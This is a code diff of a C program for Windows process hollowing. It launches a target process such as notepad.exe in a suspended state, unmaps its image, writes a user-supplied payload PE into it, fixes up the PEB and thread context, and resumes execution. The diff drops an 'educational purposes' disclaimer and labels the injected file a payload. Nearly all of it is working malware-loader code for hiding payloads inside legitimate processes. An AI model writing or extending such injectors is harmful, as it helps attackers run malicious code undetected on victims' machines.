@@ -1,4 +1,4 @@
-//Tool Written By B4shCr00k For Educational Purposes Only
+//tool written by b4shcr00k
 #include <stdio.h>
 #include <windows.h>
 #include <winternl.h>
@@ -17,7 +17,13 @@ IMAGE_NT_HEADERS32 *ntHeader;
 IMAGE_SECTION_HEADER* sectionHeader;
 IMAGE_BASE_RELOCATION *baseReloc;
 
-
+// struct used to store addresses to return them
+typedef struct infos {
+    BYTE* address1;
+    BYTE* address2;
+    BYTE* address3;
+}infos;
+//same here 
 typedef struct unmapndheader {
     PIMAGE_NT_HEADERS32 ntHeader;
     BYTE* NewAllocatedSpace;
@@ -31,6 +37,7 @@ typedef struct __PROCESS_BASIC_INFORMATION {
     ULONG_PTR UniqueProcessId;
     PVOID Reserved3;
 } _PROCESS_BASIC_INFORMATION;
+
 //function that reads the injected pe into the current process
 BYTE* ReadPEIntoCurrentProcess(char *path)
 {
@@ -68,8 +75,10 @@ BYTE* ReadPEIntoCurrentProcess(char *path)
     return inMemoryBase;
 
 }
-//writes the pe we wanna inject into the target process after unmapping it
-unmapndheader writePe(BYTE* imageBase,BYTE* unmappedAddress,PROCESS_INFORMATION pi)
+
+//writes the payload we wanna inject into the target process
+
+unmapndheader writePe(BYTE* imageBase,BYTE* unmappedAddress,PROCESS_INFORMATION pi,BYTE* pebaddress)
 {
     dosHeader = (IMAGE_DOS_HEADER*)imageBase;
     if (dosHeader->e_magic != 0x5a4d)
@@ -128,8 +137,17 @@ unmapndheader writePe(BYTE* imageBase,BYTE* unmappedAddress,PROCESS_INFORMATION 
     unmapndheader ntheaderandnewaddress;
     ntheaderandnewaddress.NewAllocatedSpace = NewAddress;
     ntheaderandnewaddress.ntHeader = ntHeader;
+    PVOID remoteImageBaseAddrField = (PBYTE)pebaddress + 0x08;
+    
+    // this updates the peb to the new baseaddress 
+    if (!WriteProcessMemory(pi.hProcess, remoteImageBaseAddrField, unmappedAddress, sizeof(unmappedAddress), NULL))
+    {
+        printf("[-] Failed To Update The New Peb\n");
+    }
+    
     return ntheaderandnewaddress;
 }
+
 //Preform Base Relocations If needed
 void BaseRelocations(BYTE* BaseAddress, PROCESS_INFORMATION pi, PIMAGE_NT_HEADERS32 ntHeader) {
     DWORD relocDirSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
@@ -184,6 +202,7 @@ void BaseRelocations(BYTE* BaseAddress, PROCESS_INFORMATION pi, PIMAGE_NT_HEADER
 
     free(relocData);
 }
+
 //Create Process In A Suspended State
 PROCESS_INFORMATION ProcessCreate(char* Path)
 {
@@ -218,7 +237,7 @@ HMODULE ResolveNtDllFunctions()
 
 }
 //Parse The Peb to get the image base address
-BYTE* GetBaseImageAddress(HANDLE hProcess, HMODULE hNtDll)
+infos GetBaseImageAddress(HANDLE hProcess, HMODULE hNtDll)
 {
     _PROCESS_BASIC_INFORMATION pbi;
     PVOID baseAddress = NULL;
@@ -226,24 +245,24 @@ BYTE* GetBaseImageAddress(HANDLE hProcess, HMODULE hNtDll)
     pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
     if (!NtQueryInformationProcess) {
         printf("[-] Failed To Get NtQueryInformationProcess Address\n");
-        return NULL;
+        
     }
 
     NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
     if (status != 0) {
         printf("[-] Failed To Retrieve Process Infos (NTSTATUS: 0x%X)\n", status);
-        return NULL;
+        
     }
 
     printf("[+] Process Infos Retrieved\n");
     if (!pbi.PebBaseAddress) {
         printf("[-] PEB Base Address is NULL\n");
-        return NULL;
+        
     }
     // Read remote PEB.ImageBaseAddress at offset 0x10
     if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x08, &baseAddress, sizeof(PVOID), NULL)) {
         printf("[-] Failed to read ImageBaseAddress from target PEB\n");
-        return NULL;
+        
     }
     printf("[+] Base Address Is 0x%p\n", baseAddress);
     
@@ -255,8 +274,10 @@ BYTE* GetBaseImageAddress(HANDLE hProcess, HMODULE hNtDll)
     else {
         printf("[-] VirtualQueryEx failed: %lu\n", GetLastError());
     }
-    
-    return baseAddress;
+    infos info;
+    info.address1 = pbi.PebBaseAddress;
+    info.address2 = baseAddress;
+    return info;
 }
 
 
@@ -307,7 +328,6 @@ int fixthread(PROCESS_INFORMATION pi, BYTE* remoteBase, PIMAGE_NT_HEADERS32 ntHe
     }
 
     printf("[+] Thread context updated. New EIP: 0x%08X\n", ctx.Eip);
-    getchar();
     // Resuming the thread after updating the context
     if (ResumeThread(pi.hThread) == (DWORD)-1) {
         printf("[-] Failed to resume thread: %lu\n", GetLastError());
@@ -322,19 +342,18 @@ int fixthread(PROCESS_INFORMATION pi, BYTE* remoteBase, PIMAGE_NT_HEADERS32 ntHe
 
 int main()
 {
-    
+
     PROCESS_INFORMATION pi = { 0 };
-    const char* targetPath = "~ENTER THE TARGET PATH HERE (USE // OR YOUL GET AN ERROR)";
-    const char* pePath = "~ENTER THE INJECTED PE PATH HERE(USE // OR YOUL GET AN ERROR)";
-    printf("-------------Tool Made By B4shCr00k");
+    const char* targetPath = "ENTER THE TARGET PROCESS PATH HERE EX : notpad.exe";
+    const char* pePath = "ENTER YOUR PAYLOAD PATH HERE MUST BE A 32 BIT VALID PE";
     BYTE* inProcessBaseAddress = ReadPEIntoCurrentProcess(pePath);
     pi = ProcessCreate(targetPath);
     HMODULE hNtDll = ResolveNtDllFunctions();
-    BYTE* unmappedAddress = GetBaseImageAddress(pi.hProcess,hNtDll);
-    UnmapTargetMemory(pi.hProcess,unmappedAddress,hNtDll);
-    unmapndheader unmapndheader = writePe(inProcessBaseAddress, unmappedAddress, pi);
+    infos info = GetBaseImageAddress(pi.hProcess,hNtDll);
+    UnmapTargetMemory(pi.hProcess,info.address2,hNtDll);
+    unmapndheader unmapndheader = writePe(inProcessBaseAddress, info.address2, pi,info.address1);
     BaseRelocations(unmapndheader.NewAllocatedSpace,pi,ntHeader);
-    WriteToProcess(pi, unmapndheader.NewAllocatedSpace,ntHeader);
+    fixthread(pi, unmapndheader.NewAllocatedSpace,ntHeader);
 
     //cleanup 
     CloseHandle(pi.hProcess);   
